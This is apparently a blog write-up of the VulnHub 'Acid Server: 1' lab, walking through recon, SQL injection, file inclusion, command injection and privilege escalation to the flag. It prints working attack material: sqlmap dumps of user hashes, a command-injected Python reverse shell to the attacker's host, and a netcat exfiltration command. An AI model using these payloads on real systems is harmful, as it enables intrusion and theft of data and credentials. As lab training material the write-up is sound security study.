---
layout: post
title: "Acid Server: 1"
date: 2015-08-17 21:00:53 +0200
comments: true
categories: [vulnhub, acid]
---
Image: [Acid Server: 1](https://www.vulnhub.com/entry/acid-server-1,125/)

We received the IP address 192.168.80.158 for the vulnerable image. Nmap output for TCP scan:
{% codeblock %}
root@kali32:~# nmap -sT -p- 192.168.80.158 -sV

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-29 13:45 CEST
Nmap scan report for 192.168.80.158
Host is up (0.00045s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE VERSION
33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
MAC Address: 00:0C:29:36:7B:18 (VMware)
{% endcodeblock %}

We found the web server. There was a hex value as the last line of the index page:
{% codeblock %}
root@kali32:~# curl http://192.168.80.158:33447/
[ .. snip ..]
<!--0x643239334c6d70775a773d3d-->
{% endcodeblock %}

Converting in python:
{% codeblock %}
root@kali32:~# python
>>> s = '643239334c6d70775a773d3d'

>>> s.decode('hex')
'd293LmpwZw=='

>>> import base64

>>> base64.b64decode(s.decode('hex'))
'wow.jpg'
{% endcodeblock %}

We downloaded the [picture](http://192.168.80.158:33447/images/wow.jpg) and found another hex string:
{% codeblock %}
root@kali32:~# strings wow.jpg

37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34
{% endcodeblock %}

{% codeblock %}
root@kali32:~# python

>>> import re
>>> s = '37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34'

>>> re.sub(':', '', s).decode('hex')
'7aee0f6d588ed9905ee37f16a7c610d4'
{% endcodeblock %}

Googling this MD5 hash, we found out that it represents the value `63425`:
{% codeblock %}
root@kali32:~# echo -n 63425 | md5sum
7aee0f6d588ed9905ee37f16a7c610d4  -
{% endcodeblock %}

After a few minutes of waiting, the UDP scan finished, but we found only NTP server listening:
{% codeblock %}
root@kali32:~# nmap 192.168.80.158 -sU
...
PORT    STATE SERVICE
123/udp open  ntp
{% endcodeblock %}

Reading the page title (or dirb tool) reveals an interesting URL: http://192.168.80.158:33447/Challenge/

{% codeblock %}
root@kali32:~# curl -s http://192.168.80.158:33447/Challenge/index.php | head -1
<!DOCTYPE gkg.qvpn html>
...
>>> codecs.encode('gkg.qvpn', 'rot13')
'txt.dica'

root@kali32:~# curl -s http://192.168.80.158:33447/Challenge/acid.txt
/protected_page.php
{% endcodeblock %}

We had no further access for `/protected_page.php`, but the first idea that we had was a referrer check. After verifying by spoofing this value:

{% codeblock lang:html %}
GET /Challenge/protected_page.php HTTP/1.1
Host: 192.168.80.158:33447
Referer: http://192.168.80.158:33447/Challenge/includes/process_login.php
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: sec_session_id=a2gico0b4hgkd0e2av9k3qh8m0
Connection: keep-alive

..

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="styles/main.css" />
        <title>Secure Login: Protected Page</title>
    </head>
    <body>
         <div class="wrapper">
                <div class="container">

                                                <p> <h1>Congrats..! You have bypassed User Panel Successfully.</h1> <br>
                        <p><h3>There is long way to go :-) <a href="hacked.php">Click Here to Proceed Further</a>.</h3></p>

                        <p><h3>If you are done, please <a href="includes/logout.php">log out</a>.</h3></p>

                            </body>
</html>
..
{% endcodeblock %}

Proceeding further, there are a few hints for sql injection, but nothing that we have tried worked:
http://192.168.80.158:33447/Challenge/hacked.php?id=33&add=Add+ID

Trying sqlmap or manual identification was without success, however Burp
Suite Scanner revealed, that the parameter ID is vulnerable, when it's sent in POST
method:

{% codeblock lang:html %}
POST /Challenge/hacked.php?add=Add_ID HTTP/1.1
Host: 192.168.80.158:33447
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.80.158:33447/Challenge/hacked.php
Cookie: sec_session_id=1mo7qhj43ul3d90kin24am4531
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

id=1'
...


Could not enter data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''))' at line
{% endcodeblock %}

Now we can use sqlmap and retrieve some useful information:
{% codeblock %}
root@kali32:~# sqlmap -u "http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID" --cookie="sec_session_id=1mo7qhj43ul3d90kin24am4531" -p id --method=POST --data="id=1" -a
...

web server operating system: Linux Ubuntu
web application technology: Apache 2.4.10
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5.0
banner:    '5.6.25-0ubuntu0.15.04.1'
current user:    'root@localhost'
current database:    'secure_login'
hostname:    'acid'
current user is DBA:    True

root@kali32:~# sqlmap -u "http://192.168.80.158:33447/Challenge/hacked.php?add=Add+ID" --cookie="sec_session_id=1mo7qhj43ul3d90kin24am4531" -p id --method=POST --data="id=1"  -D secure_login --tables --columns --dump

root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat success.csv
id,VXNlcnMudHh0,Y0dGemN5NTBlSFE9
1,lol,lol1

root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo VXNlcnMudHh0 | base64 -d
Users.txt

root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo Y0dGemN5NTBlSFE9 | base64 -d
cGFzcy50eHQ=

root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# echo cGFzcy50eHQ= | base64 -d
pass.txt

root@kali32:~/.sqlmap/output/192.168.80.158/dump/secure_login# cat members.csv
id,salt,email,username,password
1,f9aab579fc1b41ed0c44fe4ecdbfcdb4cb99b9023abb241a6db833288f4eea3c02f76e0d35204a8695077dcf81932aa59006423976224be0390395bae152d4ef,test@example.com,test_user,00807432eae173f652f2064bdca1b61b290b52d40e429a7d295d76a71084aa96c0233b82f1feac45529e0726559645acaed6f3ae58a286b9f075916ebf66cacc
2,8a93f1fa3259a90d9cfafcc1ef43dfc2d0a2d6cba0e8f2f9c23ae6b701364aa278bf5629585c3663ae3df5c7a3734ca6af4019d7ef897f45cb0acc056c3e735f,acid@gmail.com,Acid,53b9bd4416ec581838c4bde217e09f1206b94cdb95475cddda862894f4dbbeec5ceacc2e116a64cb56d8384404738c5fd16478e0266962eeb3b61da1918d5931
3,be02c5499ba4fd559dc7809a7fae01d6f251e781dbdf5a7af2c7bca320006f1a5275d8020d5c539d116e54b1bf775018349c721151d9111ad1c3da8f6b9c9697,saman.j.l33t@gmail.com,saman,c124191d7a267cb2b83b2c59a30b2e388b77f13955340015462bffc0d90cfa7b402ecb8e3fc82717f22b127c98a4afa9ed4f3661d824c6c57a1490f9963d9234
4,c72ccb8eb5ac065eca5341ff8ed296648b92bc99b511300a4525e8c17679ecce06e8038e582b539acf17008f9fd3a394d912f1158ef7f3d16d5f66ba32ca18bb,vik.create@gmail.com,Vivek,fb8db054a75254633052d951002065109cd96fe990bf5a5d5bd1581d3578235a69224784b29870046d21d95567cdfe292221fbabce17201b23ca0fd5ee4fa20e
{% endcodeblock %}

Because the hashes are salted SHA512, it was not reasonable to crack them. Instead, using google we found the hashes from test_user [here](http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL):

{% codeblock %}
Username: test_user
Email: test@example.com
Password: 6ZaxN2Vzm9NUJT2y
{% endcodeblock %}

We log in and proceed to the text step:
{% codeblock %}
http://192.168.80.158:33447/Challenge/
http://192.168.80.158:33447/Challenge/include.php
{% endcodeblock %}

There was `<!--0x5933566a4c6e4a34626e413d-->` on the page, that means after hex/base64/rot13/reverse `cake.php`. 

We identified LFI:
{% codeblock %}
GET /Challenge/include.php?file=/etc/passwd&add=Extract+File HTTP/1.1
Host: 192.168.80.158:33447
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.80.158:33447/Challenge/include.php
Cookie: sec_session_id=f1c3r9m5ud1pdctd6efvgu7ti6
Connection: keep-alive

...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:110::/home/syslog:/bin/false
messagebus:x:105:112::/var/run/dbus:/bin/false
uuidd:x:106:113::/run/uuidd:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
ntp:x:108:117::/home/ntp:/bin/false
whoopsie:x:109:118::/nonexistent:/bin/false
acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
saman:x:1001:1001:,,,:/home/saman:/bin/bash
{% endcodeblock %}

http://192.168.80.158:33447/Challenge/cake.php shows also the http://192.168.80.158:33447/Challenge/Magic_Box/ URL.

Dirb found http://192.168.80.158:33447/Challenge/Magic_Box/proc, where we put our next focus. 

We wanted to hack the server using `/proc/self/environ` technique, but the server was a recent ubuntu version and we found only reference to session variable [file](http://192.168.80.158:33447/Challenge/include.php?file=/proc/self/fd/14&add=Extract+File).

{% codeblock %}
http://192.168.80.158:33447/Challenge/include.php?file=/proc/cmdline&add=Extract+File
http://192.168.80.158:33447/Challenge/include.php?file=/boot/config-3.19.0-15-generic&add=Extract+File
{% endcodeblock %}

We gave up hacking via /proc, but dirb reveals another files:
{% codeblock %}
root@kali32:~# dirb http://192.168.80.158:33447/Challenge/Magic_Box/  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -X .html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml -fw

-----------------
DIRB v2.21
By The Dark Raver
-----------------

START_TIME: Wed Apr 29 18:52:56 2015
URL_BASE: http://192.168.80.158:33447/Challenge/Magic_Box/
WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
OPTION: Fine tunning of NOT_FOUND detection
OPTION: Not Stoping on warning messages
EXTENSIONS_LIST: (.html,.php,.ini,.txt,.inc,.zip,.bak,.rar,.xml) | (.html)(.php)(.ini)(.txt)(.inc)(.zip)(.bak)(.rar)(.xml) [NUM = 9]

-----------------

GENERATED WORDS: 219174
(!) WARNING: Wordlist is too large. This will take a long time to end.
    (Use mode '-w' if you want to scan anyway)

---- Scanning URL: http://192.168.80.158:33447/Challenge/Magic_Box/ ----
+ http://192.168.80.158:33447/Challenge/Magic_Box/low.php (CODE:200|SIZE:0)
+ http://192.168.80.158:33447/Challenge/Magic_Box/command.php (CODE:200|SIZE:54)
+ http://192.168.80.158:33447/Challenge/Magic_Box/tails.php (CODE:200|SIZE:74)
{% endcodeblock %}

Now we understand from the index page the sentence `Fairy tails uses secret keys to open the magical doors.`

Seems that we almost won, because RCE (OS Commanding) on http://192.168.80.158:33447/Challenge/Magic_Box/tails.php. 

{% codeblock %}
POST /Challenge/Magic_Box/command.php HTTP/1.1
Host: 192.168.80.158:33447
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.80.158:33447/Challenge/Magic_Box/command.php
Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

IP=127.0.0.1;id&submit=submit

...

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.016 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.013/0.015/0.017/0.003 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endcodeblock %}

We realized after a few seconds, that there is no nc with executable property,
no curl, no wget and no writable place in DocumentRoot on obvious place, we tried
to store something to `/var/www/html/`. We could send anything over netcat, but
using python reverse shell could be more efficient:

{% codeblock %}
root@kali32:~# nc -l -p 1337

POST /Challenge/Magic_Box/command.php HTTP/1.1
Host: 192.168.80.158:33447
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.80.158:33447/Challenge/Magic_Box/command.php
Cookie: sec_session_id=pieetao0om7q8pop7rgt3i45a2
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

IP=x ;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.80.137",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&submit=submit
{% endcodeblock %}

We are connected and now we need to escalate our privileges. We found:
{% codeblock %}
$ cat psl-config.php
<?php
define("HOST", "localhost");                    // The host you want to connect to.
define("USER", "root");                         // The database username.
define("PASSWORD", "mehak");    // The database password.
define("DATABASE", "secure_login");             // The database name.

www-data@acid:/$ find / -user acid 2>/dev/null
/sbin/raw_vs_isi/hint.pcapng
/bin/pwn_me
/bin/pwn_me/chkrootkit.lsm
/bin/pwn_me/chkrootkit
/bin/pwn_me/README.chkwtmp
/bin/pwn_me/ACKNOWLEDGMENTS
/bin/pwn_me/chkdirs.c
/bin/pwn_me/ifpromisc.c
/bin/pwn_me/Makefile
/bin/pwn_me/chklastlog.c
/bin/pwn_me/strings.c
/bin/pwn_me/chkwtmp.c
/bin/pwn_me/README.chklastlog
/bin/pwn_me/COPYRIGHT
/bin/pwn_me/chkproc.c
/bin/pwn_me/README
/bin/pwn_me/chkutmp.c
/bin/pwn_me/check_wtmpx.c
/var/lib/lightdm-data/acid
/var/www/html/Challenge/less
/var/www/html/Challenge/less/style.less
/var/www/html/Challenge/css
/var/www/html/Challenge/css/style.css
/var/www/html/Challenge/css/style.css.save
/var/www/html/index.html
/var/www/html/images
/var/www/html/images/bg.jpg
/var/www/html/images/Thumbs.db
/var/www/html/images/wow.jpg
/var/www/html/css
/var/www/html/css/style.css
/home/acid
/home/acid/.xsession-errors.old
/home/acid/Public
/home/acid/.thumbnails
/home/acid/Desktop
/home/acid/.mozilla
/home/acid/.gconf
/home/acid/Videos
/home/acid/Templates
/home/acid/.config
/home/acid/Music
/home/acid/.profile
/home/acid/.bashrc
/home/acid/.sudo_as_admin_successful
/home/acid/Downloads
/home/acid/.xsession-errors
/home/acid/.dmrc
/home/acid/.Xauthority
/home/acid/.local
/home/acid/.local/share
/home/acid/.xscreensaver
/home/acid/.bash_history
/home/acid/.bash_logout
{% endcodeblock %}

The first file was suspicious, after copying to our server and simple analysis we found the following:
{% codeblock %}
root@kali32:~# nc -l -p 1399 > dump

www-data@acid:/$ base64 /sbin/raw_vs_isi/hint.pcapng | nc 192.168.80.137 1399

root@kali32:~# base64 -d dump > capfile

root@kali32:/var/www# tcpick -C -yU -r capfile | less -R
...
What was the name of the Culprit ???
saman and now a days he's known by the alias of 1337hax0r
oh...Fuck....Great...Now, we gonna Catch Him Soon :D
...
{% endcodeblock %}

Finally, we use the string `1337hax0r` as password:
{% codeblock %}
www-data@acid:/home/acid$ su saman

Password: 1337hax0r

saman@acid:/home/acid$ sudo su

[sudo] password for saman: 1337hax0r

  ____                            _         _       _   _
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/

root@acid:~# cat flag.txt



Dear Hax0r,


You have successfully completed the challenge.

I  hope you like it.


FLAG NAME: "Acid@Makke@Hax0r"


Kind & Best Regards

-ACID
facebook: https://facebook.com/m.avinash143
{% endcodeblock %}
